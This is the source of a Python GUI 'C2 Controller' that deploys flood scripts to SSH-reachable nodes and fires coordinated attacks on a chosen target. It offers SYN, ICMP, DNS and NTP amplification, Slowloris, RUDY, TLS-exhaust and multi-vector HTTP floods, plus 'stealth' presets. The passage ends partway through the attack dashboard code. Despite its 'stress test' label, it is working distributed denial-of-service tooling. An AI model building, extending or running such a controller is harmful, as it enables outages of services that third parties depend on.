#!/usr/bin/env python3
"""
C2 Controller — GUI version.
tkinter (stdlib), no external deps. Compiles to .exe with PyInstaller.
"""

import json
import os
import subprocess
import sys
import threading
import time
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from pathlib import Path
from collections import deque

def _app_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

APP_DIR = _app_dir()
NODES_FILE = os.path.join(APP_DIR, "nodes.json")
AGENTS_DIR = os.path.join(APP_DIR, "agents")
SCRIPT_L3 = "stresstest.py"
SCRIPT_L7 = "webstress.py"

# ─── Colors ──────────────────────────────────────────────────────────────────

BG = "#1a1a2e"
BG2 = "#16213e"
BG3 = "#0f3460"
FG = "#e0e0e0"
FG_DIM = "#888888"
ACCENT = "#e94560"
GREEN_C = "#00e676"
YELLOW_C = "#ffd600"
CYAN_C = "#00e5ff"
RED_C = "#ff1744"
BLUE_C = "#448aff"
WHITE_C = "#ffffff"

# ─── Protocol config ─────────────────────────────────────────────────────────

PROTOCOL_MAP = {
    # ─ L3/L4 (stresstest.py) ─
    "UDP":               {"cli": "udp",       "default_port": 9000,  "fields": "standard",  "script": "l3"},
    "TCP":               {"cli": "tcp",       "default_port": 9000,  "fields": "standard",  "script": "l3"},
    "HTTP (Basic)":      {"cli": "http",      "default_port": 80,    "fields": "http",      "script": "l3"},
    "HTTPS/TLS Flood":   {"cli": "tls",       "default_port": 443,   "fields": "standard",  "script": "l3"},
    "SYN":               {"cli": "syn",       "default_port": 80,    "fields": "standard",  "script": "l3", "root": True},
    "ICMP":              {"cli": "icmp",      "default_port": 0,     "fields": "standard",  "script": "l3", "root": True},
    "DNS Amplification": {"cli": "dns",       "default_port": 53,    "fields": "amp",       "script": "l3", "root": True},
    "Slowloris (Basic)": {"cli": "slowloris", "default_port": 80,    "fields": "slowloris", "script": "l3"},
    "NTP Amplification": {"cli": "ntp",       "default_port": 123,   "fields": "amp",       "script": "l3", "root": True},
    "GRE":               {"cli": "gre",       "default_port": 0,     "fields": "standard",  "script": "l3", "root": True},
    "VSE":               {"cli": "vse",       "default_port": 27015, "fields": "vse",       "script": "l3"},
    # ─ L7 (webstress.py) ─
    "HTTP Flood (L7)":   {"cli": "http",      "default_port": 80,    "fields": "l7",        "script": "l7"},
    "HTTPS Flood (L7)":  {"cli": "https",     "default_port": 443,   "fields": "l7",        "script": "l7"},
    "TLS Exhaust":       {"cli": "tls_exhaust","default_port": 443,  "fields": "l7",        "script": "l7"},
    "Slowloris (L7)":    {"cli": "slowloris", "default_port": 80,    "fields": "l7",        "script": "l7"},
    "RUDY":              {"cli": "rudy",      "default_port": 80,    "fields": "l7",        "script": "l7"},
    "HTTP Pipeline":     {"cli": "pipeline",  "default_port": 80,    "fields": "l7",        "script": "l7"},
    "Cache Bypass":      {"cli": "bypass",    "default_port": 80,    "fields": "l7",        "script": "l7"},
    "POST Flood (L7)":   {"cli": "post",      "default_port": 80,    "fields": "l7",        "script": "l7"},
    "HEAD Flood (L7)":   {"cli": "head",      "default_port": 80,    "fields": "l7",        "script": "l7"},
    "Multi-Vector (L7)": {"cli": "multi",     "default_port": 80,    "fields": "l7",        "script": "l7"},
}

PROTOCOL_NAMES = list(PROTOCOL_MAP.keys())

PRESETS = {
    # L3/L4
    "Light (L3)": {
        "protocol": "UDP", "workers": 50, "duration": 15, "pkt": 512, "port": 9000,
        "method": "GET", "https": False, "jitter": 0, "rate_limit": 0,
    },
    "Medium (L3)": {
        "protocol": "TCP", "workers": 150, "duration": 30, "pkt": 4096, "port": 9000,
        "method": "GET", "https": False, "jitter": 0, "rate_limit": 0,
    },
    "Heavy (L3)": {
        "protocol": "UDP", "workers": 300, "duration": 60, "pkt": 1400, "port": 9000,
        "method": "GET", "https": False, "jitter": 0, "rate_limit": 0,
    },
    "Maximum (L3)": {
        "protocol": "SYN", "workers": 400, "duration": 60, "pkt": 0, "port": 80,
        "method": "GET", "https": False, "jitter": 0, "rate_limit": 0,
    },
    "Amplified (DNS)": {
        "protocol": "DNS Amplification", "workers": 100, "duration": 30, "pkt": 0, "port": 53,
        "method": "GET", "https": False, "jitter": 0, "rate_limit": 0,
    },
    # L7
    "Web Flood (L7)": {
        "protocol": "HTTP Flood (L7)", "workers": 500, "duration": 30, "pkt": 0, "port": 80,
        "method": "GET", "https": False, "jitter": 0, "rate_limit": 0,
    },
    "HTTPS Drain (L7)": {
        "protocol": "HTTPS Flood (L7)", "workers": 300, "duration": 30, "pkt": 0, "port": 443,
        "method": "GET", "https": False, "jitter": 0, "rate_limit": 0,
    },
    "TLS Exhaust (L7)": {
        "protocol": "TLS Exhaust", "workers": 400, "duration": 30, "pkt": 0, "port": 443,
        "method": "GET", "https": False, "jitter": 0, "rate_limit": 0,
    },
    "Stealth Slowloris (L7)": {
        "protocol": "Slowloris (L7)", "workers": 50, "duration": 120, "pkt": 0, "port": 80,
        "method": "GET", "https": False, "jitter": 0, "rate_limit": 0,
    },
    "Multi-Vector (L7)": {
        "protocol": "Multi-Vector (L7)", "workers": 500, "duration": 60, "pkt": 0, "port": 80,
        "method": "GET", "https": False, "jitter": 100, "rate_limit": 0,
    },
    "Stealth Web (L7)": {
        "protocol": "HTTP Flood (L7)", "workers": 100, "duration": 60, "pkt": 0, "port": 80,
        "method": "GET", "https": False, "jitter": 500, "rate_limit": 10,
    },
}

# ─── SSH / SCP ───────────────────────────────────────────────────────────────

def ssh_cmd(node, cmd, timeout=30):
    key_path = node.get("key", "")
    user = node.get("user", "ubuntu")
    host = node["ip"]
    port = node.get("port", 22)

    args = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10", "-o", "BatchMode=yes"]
    if key_path:
        args += ["-i", key_path]
    args += ["-p", str(port), f"{user}@{host}", cmd]

    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout,
                           creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1
    except Exception as e:
        return "", str(e), -1


def ssh_stream(node, cmd):
    key_path = node.get("key", "")
    user = node.get("user", "ubuntu")
    host = node["ip"]
    port = node.get("port", 22)

    args = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
            "-o", "BatchMode=yes", "-o", "ServerAliveInterval=5"]
    if key_path:
        args += ["-i", key_path]
    args += ["-p", str(port), f"{user}@{host}", cmd]

    return subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1,
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)


def scp_upload(node, local_path, remote_path):
    key_path = node.get("key", "")
    user = node.get("user", "ubuntu")
    host = node["ip"]
    port = node.get("port", 22)

    args = ["scp", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10", "-o", "BatchMode=yes"]
    if key_path:
        args += ["-i", key_path]
    args += ["-P", str(port), local_path, f"{user}@{host}:{remote_path}"]

    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=60,
                           creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
        return r.returncode == 0
    except Exception:
        return False


# ─── Node storage ────────────────────────────────────────────────────────────

def load_nodes():
    if Path(NODES_FILE).exists():
        with open(NODES_FILE, "r") as f:
            return json.load(f)
    return []


def save_nodes(nodes):
    with open(NODES_FILE, "w") as f:
        json.dump(nodes, f, indent=2)


# ─── Helpers ─────────────────────────────────────────────────────────────────

def format_bytes(b):
    if b >= 1_073_741_824:
        return f"{b / 1_073_741_824:.2f} GB"
    if b >= 1_048_576:
        return f"{b / 1_048_576:.2f} MB"
    if b >= 1024:
        return f"{b / 1024:.1f} KB"
    return f"{b} B"


# ─── App ─────────────────────────────────────────────────────────────────────

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("C2 Controller")
        self.geometry("900x700")
        self.minsize(850, 650)
        self.configure(bg=BG)
        self.resizable(True, True)

        try:
            self.iconbitmap(default="")
        except Exception:
            pass

        self.style = ttk.Style()
        self.style.theme_use("clam")
        self._configure_styles()

        self.container = tk.Frame(self, bg=BG)
        self.container.pack(fill="both", expand=True)

        self.frames = {}
        for F in (MainPage, NodesPage, CheckPage, DeployPage, AttackPage, QuickFirePage, MultiAttackPage, ShellPage):
            frame = F(self.container, self)
            self.frames[F.__name__] = frame
            frame.place(relx=0, rely=0, relwidth=1, relheight=1)

        self.show("MainPage")

    def _configure_styles(self):
        s = self.style
        s.configure(".", background=BG, foreground=FG, font=("Consolas", 10))
        s.configure("TFrame", background=BG)
        s.configure("TLabel", background=BG, foreground=FG, font=("Consolas", 10))
        s.configure("Title.TLabel", background=BG, foreground=WHITE_C, font=("Consolas", 18, "bold"))
        s.configure("Sub.TLabel", background=BG, foreground=FG_DIM, font=("Consolas", 9))
        s.configure("Stat.TLabel", background=BG2, foreground=YELLOW_C, font=("Consolas", 11))
        s.configure("StatVal.TLabel", background=BG2, foreground=WHITE_C, font=("Consolas", 13, "bold"))
        s.configure("Node.TLabel", background=BG2, foreground=FG, font=("Consolas", 10))
        s.configure("Online.TLabel", background=BG2, foreground=GREEN_C, font=("Consolas", 10, "bold"))
        s.configure("Offline.TLabel", background=BG2, foreground=RED_C, font=("Consolas", 10, "bold"))
        s.configure("Firing.TLabel", background=BG2, foreground=GREEN_C, font=("Consolas", 10, "bold"))
        s.configure("Paused.TLabel", background=BG2, foreground=YELLOW_C, font=("Consolas", 10, "bold"))

        s.configure("Action.TButton", background=ACCENT, foreground=WHITE_C, font=("Consolas", 11, "bold"),
                     padding=(20, 10), borderwidth=0)
        s.map("Action.TButton", background=[("active", "#c81e45"), ("pressed", "#a01535")])

        s.configure("Nav.TButton", background=BG3, foreground=FG, font=("Consolas", 10),
                     padding=(15, 8), borderwidth=0)
        s.map("Nav.TButton", background=[("active", "#1a4a8a")])

        s.configure("Back.TButton", background=BG2, foreground=FG_DIM, font=("Consolas", 9),
                     padding=(10, 5), borderwidth=0)
        s.map("Back.TButton", background=[("active", BG3)])

        s.configure("Danger.TButton", background=RED_C, foreground=WHITE_C, font=("Consolas", 11, "bold"),
                     padding=(20, 10), borderwidth=0)
        s.map("Danger.TButton", background=[("active", "#d50000")])

        s.configure("Green.TButton", background=GREEN_C, foreground=BG, font=("Consolas", 11, "bold"),
                     padding=(20, 10), borderwidth=0)
        s.map("Green.TButton", background=[("active", "#00c853")])

        s.configure("TEntry", fieldbackground=BG2, foreground=WHITE_C, insertcolor=WHITE_C,
                     font=("Consolas", 11), borderwidth=1, padding=5)

        s.configure("Dark.TCombobox", fieldbackground=BG2, foreground=WHITE_C, background=BG3,
                     selectbackground=BG3, selectforeground=WHITE_C, font=("Consolas", 11))
        s.map("Dark.TCombobox", fieldbackground=[("readonly", BG2)], foreground=[("readonly", WHITE_C)])

    def show(self, name):
        frame = self.frames[name]
        frame.tkraise()
        if hasattr(frame, "on_show"):
            frame.on_show()


# ─── Main Menu ───────────────────────────────────────────────────────────────

class MainPage(tk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent, bg=BG)
        self.app = app

        hdr = tk.Frame(self, bg=BG)
        hdr.pack(pady=(40, 10))
        tk.Label(hdr, text="C2 CONTROLLER", bg=BG, fg=WHITE_C,
                 font=("Consolas", 22, "bold")).pack()
        tk.Label(hdr, text="multi-node stress test command center", bg=BG, fg=FG_DIM,
                 font=("Consolas", 10)).pack(pady=(2, 0))

        self.node_count = tk.Label(hdr, text="", bg=BG, fg=GREEN_C, font=("Consolas", 10))
        self.node_count.pack(pady=(8, 0))

        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(pady=20)

        buttons = [
            ("Nodes", "NodesPage"),
            ("Check", "CheckPage"),
            ("Deploy", "DeployPage"),
            ("Fire Attack", "AttackPage"),
            ("Quick Fire", "QuickFirePage"),
            ("Multi", "MultiAttackPage"),
            ("Shell", "ShellPage"),
        ]

        for i, (text, page) in enumerate(buttons):
            row, col = divmod(i, 3)
            style = "Danger.TButton" if ("Fire" in text and "Quick" not in text) or text == "Multi" else "Nav.TButton"
            if text == "Quick Fire":
                style = "Action.TButton"
            btn = ttk.Button(btn_frame, text=text, style=style,
                             command=lambda p=page: self.app.show(p))
            btn.grid(row=row, column=col, padx=8, pady=8, sticky="nsew")
            btn_frame.columnconfigure(col, weight=1, minsize=200)

        ttk.Button(self, text="Quit", style="Back.TButton",
                   command=self.app.destroy).pack(pady=(20, 0))

    def on_show(self):
        nodes = load_nodes()
        n = len(nodes)
        self.node_count.config(text=f"● {n} node{'s' if n != 1 else ''} registered",
                               fg=GREEN_C if n > 0 else RED_C)


# ─── Nodes Page ──────────────────────────────────────────────────────────────

class NodesPage(tk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent, bg=BG)
        self.app = app

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=20, pady=(20, 10))
        ttk.Button(top, text="← Back", style="Back.TButton",
                   command=lambda: app.show("MainPage")).pack(side="left")
        tk.Label(top, text="NODES", bg=BG, fg=WHITE_C, font=("Consolas", 16, "bold")).pack(side="left", padx=15)

        form = tk.Frame(self, bg=BG2, padx=15, pady=12)
        form.pack(fill="x", padx=20, pady=(0, 10))

        fields = [("Name", "name_var"), ("IP", "ip_var"), ("User", "user_var"),
                  ("Port", "port_var"), ("Key Path", "key_var")]
        self.vars = {}
        for i, (label, var_name) in enumerate(fields):
            tk.Label(form, text=label, bg=BG2, fg=FG_DIM, font=("Consolas", 9)).grid(row=0, column=i, padx=4)
            v = tk.StringVar()
            self.vars[var_name] = v
            w = 12 if label != "Key Path" else 25
            e = tk.Entry(form, textvariable=v, bg=BG, fg=WHITE_C, insertbackground=WHITE_C,
                         font=("Consolas", 10), width=w, relief="flat", bd=2)
            e.grid(row=1, column=i, padx=4, pady=(2, 0))

        self.vars["user_var"].set("user")
        self.vars["port_var"].set("22")

        btn_f = tk.Frame(form, bg=BG2)
        btn_f.grid(row=1, column=len(fields), padx=(10, 0))
        ttk.Button(btn_f, text="+ Add", style="Green.TButton", command=self._add).pack()

        ttk.Button(form, text="...", style="Back.TButton", command=self._browse_key).grid(row=1, column=len(fields)+1, padx=4)

        self.list_frame = tk.Frame(self, bg=BG)
        self.list_frame.pack(fill="both", expand=True, padx=20, pady=5)

    def _browse_key(self):
        path = filedialog.askopenfilename(title="Select SSH Key",
                                          filetypes=[("Key files", "*.key *.pem"), ("All", "*.*")])
        if path:
            self.vars["key_var"].set(path)

    def _add(self):
        ip = self.vars["ip_var"].get().strip()
        if not ip:
            return
        node = {
            "name": self.vars["name_var"].get().strip() or ip,
            "ip": ip,
            "user": self.vars["user_var"].get().strip() or "user",
            "port": int(self.vars["port_var"].get().strip() or "22"),
        }
        key = self.vars["key_var"].get().strip()
        if key:
            node["key"] = key

        nodes = load_nodes()
        nodes.append(node)
        save_nodes(nodes)

        for v in self.vars.values():
            v.set("")
        self.vars["user_var"].set("user")
        self.vars["port_var"].set("22")
        self._refresh()

    def _remove(self, idx):
        nodes = load_nodes()
        if 0 <= idx < len(nodes):
            nodes.pop(idx)
            save_nodes(nodes)
            self._refresh()

    def _refresh(self):
        for w in self.list_frame.winfo_children():
            w.destroy()

        nodes = load_nodes()
        if not nodes:
            tk.Label(self.list_frame, text="No nodes registered.", bg=BG, fg=FG_DIM,
                     font=("Consolas", 10)).pack(pady=20)
            return

        for i, n in enumerate(nodes):
            row = tk.Frame(self.list_frame, bg=BG2, padx=10, pady=6)
            row.pack(fill="x", pady=2)

            tk.Label(row, text=f"● {n.get('name', n['ip'])}", bg=BG2, fg=CYAN_C,
                     font=("Consolas", 11, "bold")).pack(side="left")
            tk.Label(row, text=f"  {n.get('user','ubuntu')}@{n['ip']}:{n.get('port',22)}",
                     bg=BG2, fg=FG_DIM, font=("Consolas", 9)).pack(side="left", padx=(10, 0))
            if n.get("key"):
                tk.Label(row, text=f"  key:{Path(n['key']).name}", bg=BG2, fg=FG_DIM,
                         font=("Consolas", 9)).pack(side="left")

            ttk.Button(row, text="✕", style="Back.TButton",
                       command=lambda idx=i: self._remove(idx)).pack(side="right")

    def on_show(self):
        self._refresh()


# ─── Check Page ──────────────────────────────────────────────────────────────

class CheckPage(tk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent, bg=BG)
        self.app = app

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=20, pady=(20, 10))
        ttk.Button(top, text="← Back", style="Back.TButton",
                   command=lambda: app.show("MainPage")).pack(side="left")
        tk.Label(top, text="CHECK NODES", bg=BG, fg=WHITE_C,
                 font=("Consolas", 16, "bold")).pack(side="left", padx=15)

        self.status_frame = tk.Frame(self, bg=BG)
        self.status_frame.pack(fill="both", expand=True, padx=20, pady=10)

        self.loading = tk.Label(self, text="", bg=BG, fg=YELLOW_C, font=("Consolas", 10))
        self.loading.pack(pady=5)

    def on_show(self):
        for w in self.status_frame.winfo_children():
            w.destroy()
        self.loading.config(text="Checking nodes...")
        threading.Thread(target=self._check, daemon=True).start()

    def _check(self):
        nodes = load_nodes()
        results = [None] * len(nodes)

        def _do(i, n):
            check_cmd = (
                "echo OK && python3 --version"
                " && (test -f ~/stresstest.py && echo L3_OK || echo L3_MISS)"
                " && (test -f ~/webstress.py && echo L7_OK || echo L7_MISS)"
            )
            out, err, rc = ssh_cmd(n, check_cmd, timeout=15)
            results[i] = {
                "name": n.get("name", n["ip"]), "ip": n["ip"],
                "online": "OK" in out,
                "l3_deployed": "L3_OK" in out,
                "l7_deployed": "L7_OK" in out,
                "python": next((l.strip() for l in out.split("\n") if "Python" in l), "?"),
            }

        threads = [threading.Thread(target=_do, args=(i, n)) for i, n in enumerate(nodes)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=20)

        self.after(0, lambda: self._render(results))

    def _render(self, results):
        self.loading.config(text="")
        for w in self.status_frame.winfo_children():
            w.destroy()

        for r in results:
            if r is None:
                continue
            row = tk.Frame(self.status_frame, bg=BG2, padx=12, pady=8)
            row.pack(fill="x", pady=3)

            color = GREEN_C if r["online"] else RED_C
            status = "ONLINE" if r["online"] else "OFFLINE"
            tk.Label(row, text=f"● {r['name']}", bg=BG2, fg=color,
                     font=("Consolas", 11, "bold")).pack(side="left")
            tk.Label(row, text=f"  {status}", bg=BG2, fg=color,
                     font=("Consolas", 10)).pack(side="left", padx=(10, 0))

            l3_ok = r.get("l3_deployed", False)
            l7_ok = r.get("l7_deployed", False)
            tk.Label(row, text=f"  L3: {'OK' if l3_ok else 'NO'}",
                     bg=BG2, fg=GREEN_C if l3_ok else RED_C,
                     font=("Consolas", 10)).pack(side="left", padx=(15, 0))
            tk.Label(row, text=f"  L7: {'OK' if l7_ok else 'NO'}",
                     bg=BG2, fg=GREEN_C if l7_ok else RED_C,
                     font=("Consolas", 10)).pack(side="left", padx=(8, 0))
            tk.Label(row, text=f"  {r['python']}", bg=BG2, fg=FG_DIM,
                     font=("Consolas", 9)).pack(side="left", padx=(15, 0))


# ─── Deploy Page ─────────────────────────────────────────────────────────────

class DeployPage(tk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent, bg=BG)
        self.app = app

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=20, pady=(20, 10))
        ttk.Button(top, text="← Back", style="Back.TButton",
                   command=lambda: app.show("MainPage")).pack(side="left")
        tk.Label(top, text="DEPLOY", bg=BG, fg=WHITE_C,
                 font=("Consolas", 16, "bold")).pack(side="left", padx=15)

        self.log = tk.Text(self, bg=BG2, fg=FG, font=("Consolas", 10), height=15,
                           relief="flat", bd=0, padx=10, pady=10, state="disabled")
        self.log.pack(fill="both", expand=True, padx=20, pady=10)

        ttk.Button(self, text="Deploy ALL scripts to all nodes", style="Action.TButton",
                   command=self._deploy).pack(pady=10)

    def _log(self, text, color=FG):
        self.log.config(state="normal")
        self.log.insert("end", text + "\n")
        self.log.see("end")
        self.log.config(state="disabled")

    def _deploy(self):
        self.log.config(state="normal")
        self.log.delete("1.0", "end")
        self.log.config(state="disabled")

        scripts = [
            (os.path.join(AGENTS_DIR, SCRIPT_L3), f"~/{SCRIPT_L3}"),
            (os.path.join(AGENTS_DIR, SCRIPT_L7), f"~/{SCRIPT_L7}"),
        ]

        missing = [s for s, _ in scripts if not os.path.exists(s)]
        if missing:
            for m in missing:
                self._log(f"ERROR: {os.path.basename(m)} not found next to controller_gui.py")
            return

        def _do():
            nodes = load_nodes()
            for n in nodes:
                name = n.get("name", n["ip"])
                for local, remote in scripts:
                    sname = os.path.basename(local)
                    self.after(0, lambda nm=name, sn=sname: self._log(f"  {nm} ← {sn}..."))
                    ok = scp_upload(n, local, remote)
                    status = "OK" if ok else "FAILED"
                    self.after(0, lambda nm=name, sn=sname, st=status: self._log(f"    {nm}/{sn}: {st}"))
            self.after(0, lambda: self._log("\nDone."))

        threading.Thread(target=_do, daemon=True).start()


# ─── Attack Page ─────────────────────────────────────────────────────────────

class AttackPage(tk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent, bg=BG)
        self.app = app
        self.attack_running = False
        self.attack_paused = False
        self.node_stats = {}
        self.node_procs = {}
        self.node_pids = {}
        self.lock = threading.Lock()
        self.start_time = 0
        self.duration = 30
        self.throughput_history = deque(maxlen=60)
        self.current_protocol_name = "UDP"

        # ─ top bar
        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=20, pady=(15, 5))
        self.back_btn = ttk.Button(top, text="← Back", style="Back.TButton",
                                   command=lambda: app.show("MainPage"))
        self.back_btn.pack(side="left")
        tk.Label(top, text="FIRE ATTACK", bg=BG, fg=RED_C,
                 font=("Consolas", 16, "bold")).pack(side="left", padx=15)

        # ─ config frame (scrollable area with form)
        self.config_frame = tk.Frame(self, bg=BG)
        self.config_frame.pack(fill="x", padx=20, pady=5)

        # preset row
        preset_frame = tk.Frame(self.config_frame, bg=BG2, padx=15, pady=8)
        preset_frame.pack(fill="x", pady=(0, 5))
        tk.Label(preset_frame, text="Preset:", bg=BG2, fg=FG_DIM, font=("Consolas", 10)).pack(side="left")
        self.preset_var = tk.StringVar(value="-- Select Preset --")
        preset_cb = ttk.Combobox(preset_frame, textvariable=self.preset_var, state="readonly",
                                 values=["-- Select Preset --"] + list(PRESETS.keys()),
                                 style="Dark.TCombobox", width=25)
        preset_cb.pack(side="left", padx=(8, 0))
        preset_cb.bind("<<ComboboxSelected>>", self._on_preset_change)

        # main form
        form = tk.Frame(self.config_frame, bg=BG2, padx=15, pady=12)
        form.pack(fill="x")
        self.form = form

        self.f_vars = {}

        # Row 0: Protocol + Target
        tk.Label(form, text="Protocol", bg=BG2, fg=FG_DIM, font=("Consolas", 9)).grid(
            row=0, column=0, padx=8, pady=(4, 0), sticky="w")
        self.f_vars["protocol"] = tk.StringVar(value="UDP")
        proto_cb = ttk.Combobox(form, textvariable=self.f_vars["protocol"], state="readonly",
                                values=PROTOCOL_NAMES, style="Dark.TCombobox", width=18)
        proto_cb.grid(row=1, column=0, padx=8, pady=(0, 4), sticky="ew")
        proto_cb.bind("<<ComboboxSelected>>", self._on_protocol_change)

        tk.Label(form, text="Target", bg=BG2, fg=FG_DIM, font=("Consolas", 9)).grid(
            row=0, column=1, padx=8, pady=(4, 0), sticky="w")
        self.f_vars["target"] = tk.StringVar()
        tk.Entry(form, textvariable=self.f_vars["target"], bg=BG, fg=WHITE_C, insertbackground=WHITE_C,
                 font=("Consolas", 11), width=22, relief="flat", bd=2).grid(
            row=1, column=1, padx=8, pady=(0, 4), sticky="ew")

        tk.Label(form, text="Port", bg=BG2, fg=FG_DIM, font=("Consolas", 9)).grid(
            row=0, column=2, padx=8, pady=(4, 0), sticky="w")
        self.f_vars["port"] = tk.StringVar(value="9000")
        self.port_entry = tk.Entry(form, textvariable=self.f_vars["port"], bg=BG, fg=WHITE_C,
                                   insertbackground=WHITE_C, font=("Consolas", 11), width=8, relief="flat", bd=2)
        self.port_entry.grid(row=1, column=2, padx=8, pady=(0, 4), sticky="ew")

        # Row 2: Workers/Connections + Duration + Packet Size / Method
        self.workers_label = tk.Label(form, text="Workers/node", bg=BG2, fg=FG_DIM, font=("Consolas", 9))
        self.workers_label.grid(row=2, column=0, padx=8, pady=(4, 0), sticky="w")
        self.f_vars["workers"] = tk.StringVar(value="200")
        self.workers_entry = tk.Entry(form, textvariable=self.f_vars["workers"], bg=BG, fg=WHITE_C,
                                      insertbackground=WHITE_C, font=("Consolas", 11), width=8, relief="flat", bd=2)
        self.workers_entry.grid(row=3, column=0, padx=8, pady=(0, 4), sticky="ew")

        tk.Label(form, text="Duration (s)", bg=BG2, fg=FG_DIM, font=("Consolas", 9)).grid(
            row=2, column=1, padx=8, pady=(4, 0), sticky="w")
        self.f_vars["duration"] = tk.StringVar(value="30")
        tk.Entry(form, textvariable=self.f_vars["duration"], bg=BG, fg=WHITE_C, insertbackground=WHITE_C,
                 font=("Consolas", 11), width=8, relief="flat", bd=2).grid(
            row=3, column=1, padx=8, pady=(0, 4), sticky="ew")

        # Packet size (hidden for some protocols)
        self.pkt_label = tk.Label(form, text="Packet size", bg=BG2, fg=FG_DIM, font=("Consolas", 9))
        self.pkt_label.grid(row=2, column=2, padx=8, pady=(4, 0), sticky="w")
        self.f_vars["pkt"] = tk.StringVar(value="1024")
        self.pkt_entry = tk.Entry(form, textvariable=self.f_vars["pkt"], bg=BG, fg=WHITE_C,
                                  insertbackground=WHITE_C, font=("Consolas", 11), width=8, relief="flat", bd=2)
        self.pkt_entry.grid(row=3, column=2, padx=8, pady=(0, 4), sticky="ew")

        # HTTP method dropdown (hidden by default)
        self.method_label = tk.Label(form, text="Method", bg=BG2, fg=FG_DIM, font=("Consolas", 9))
        self.f_vars["method"] = tk.StringVar(value="GET")
        self.method_cb = ttk.Combobox(form, textvariable=self.f_vars["method"], state="readonly",
                                      values=["GET", "POST"], style="Dark.TCombobox", width=8)

        # HTTPS checkbox (hidden by default)
        self.f_vars["https"] = tk.BooleanVar(value=False)
        self.https_cb = tk.Checkbutton(form, text="HTTPS", variable=self.f_vars["https"],
                                       bg=BG2, fg=FG, selectcolor=BG, activebackground=BG2,
                                       font=("Consolas", 10))

        # L7 fields: jitter + rate limit (hidden by default)
        self.jitter_label = tk.Label(form, text="Jitter (ms)", bg=BG2, fg=FG_DIM, font=("Consolas", 9))
        self.f_vars["jitter"] = tk.StringVar(value="0")
        self.jitter_entry = tk.Entry(form, textvariable=self.f_vars["jitter"], bg=BG, fg=WHITE_C,
                                     insertbackground=WHITE_C, font=("Consolas", 11), width=8, relief="flat", bd=2)

        self.rate_label = tk.Label(form, text="Rate/worker", bg=BG2, fg=FG_DIM, font=("Consolas", 9))
        self.f_vars["rate_limit"] = tk.StringVar(value="0")
        self.rate_entry = tk.Entry(form, textvariable=self.f_vars["rate_limit"], bg=BG, fg=WHITE_C,
                                   insertbackground=WHITE_C, font=("Consolas", 11), width=8, relief="flat", bd=2)

        # L7 indicator label
        self.layer_label = tk.Label(self.config_frame, text="", bg=BG, fg=CYAN_C, font=("Consolas", 9))

        # root warning
        self.root_warn = tk.Label(self.config_frame, text="", bg=BG, fg=YELLOW_C, font=("Consolas", 9))
        self.root_warn.pack(pady=(2, 0))

        self.layer_label.pack(pady=(2, 0))

        for c in range(4):
            form.columnconfigure(c, weight=1)

        ttk.Button(self.config_frame, text="🔥 FIRE", style="Danger.TButton",
                   command=self._start_attack).pack(pady=(10, 5))

        self._update_fields_for_protocol()

        # ─ dashboard (hidden until attack starts)
        self.dash_frame = tk.Frame(self, bg=BG)

        # protocol header in dashboard
        self.dash_proto_label = tk.Label(self.dash_frame, text="", bg=BG, fg=CYAN_C,
                                         font=("Consolas", 11))
        self.dash_proto_label.pack(pady=(5, 2))

        # progress bar
        self.progress_frame = tk.Frame(self.dash_frame, bg=BG2, padx=15, pady=10)
        self.progress_frame.pack(fill="x", padx=20, pady=(5, 5))

        self.progress_canvas = tk.Canvas(self.progress_frame, height=24, bg=BG, highlightthickness=0)
        self.progress_canvas.pack(fill="x", pady=(0, 5))
        self.progress_label = tk.Label(self.progress_frame, text="0.0%  0s / 0s", bg=BG2, fg=FG,
                                       font=("Consolas", 10))
        self.progress_label.pack()

        # status label
        self.status_label = tk.Label(self.dash_frame, text="ATTACKING", bg=BG, fg=RED_C,
                                     font=("Consolas", 14, "bold"))
        self.status_label.pack(pady=(5, 2))

        # stats grid
        stats_frame = tk.Frame(self.dash_frame, bg=BG2, padx=15, pady=10)
        stats_frame.pack(fill="x", padx=20, pady=5)

        self.stat_labels = {}
        stat_names = [
            ("Total Packets", "packets"), ("Total Sent", "bytes"),
            ("Packets/sec", "pps"), ("Throughput", "mbps"),
            ("Total Errors", "errors"), ("Workers", "workers_total"),
        ]
        for i, (label, key) in enumerate(stat_names):
            row, col = divmod(i, 2)
            tk.Label(stats_frame, text=label, bg=BG2, fg=YELLOW_C,
                     font=("Consolas", 9)).grid(row=row, column=col * 2, padx=(10, 5), pady=3, sticky="w")
            lbl = tk.Label(stats_frame, text="0", bg=BG2, fg=WHITE_C,
                           font=("Consolas", 12, "bold"))
            lbl.grid(row=row, column=col * 2 + 1, padx=(0, 20), pady=3, sticky="e")
            self.stat_labels[key] = lbl
            stats_frame.columnconfigure(col * 2, weight=1)
            stats_frame.columnconfigure(col * 2 + 1, weight=1)

        # throughput graph
        graph_frame = tk.Frame(self.dash_frame, bg=BG2, padx=10, pady=8)
        graph_frame.pack(fill="x", padx=20, pady=(2, 5))
        tk.Label(graph_frame, text="Throughput (MB/s)", bg=BG2, fg=FG_DIM,
                 font=("Consolas", 9)).pack(anchor="w")
        self.graph_canvas = tk.Canvas(graph_frame, height=60, bg=BG, highlightthickness=0)
